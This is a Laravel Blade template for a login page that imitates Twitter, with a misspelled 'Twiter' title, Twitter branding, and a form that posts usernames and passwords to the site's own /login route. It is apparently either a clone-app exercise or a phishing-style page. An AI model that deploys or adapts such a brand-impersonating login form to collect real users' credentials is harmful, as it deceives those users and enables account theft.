<!doctype html>
<html lang="en">
  <head>
    <title>log in to Twiter / Twiter</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="css/app.css" type="text/css" />
    <link rel="icon" href="images/twitter.ico" type="image/x-icon"/>
  </head>
  <body>
  <div class="container">
      <div class="row">
        <div class="col-md-3"></div>
        <div class="col-md-6 p-0 pt-3">
          <i class="fa fa-twitter"></i>
          <h3 class="text-center pt-3">Log in to Twitter</h3>
        <form action="{{url('/')}}/login" method="post">
        @csrf
            <div class="mb-3 bg-color">
              <label>Phone, email, or username</label>
              <input type="text" name="detail" class="form-control" required>
            </div>
            <div class="mb-3 bg-color">
              <label>Password</label>
              <input type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Log in</button>
            <div class="text-center pt-3 pb-3">
              <a href="{{url('/forget')}}" class="">Forgotten password?</a> . 
              <a href="{{url('/signup')}}" class="">Sign up for Twitter</a>
            </div>
          </form>
        </div>
        <div class="col-md-3"></div>
      </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  </body>
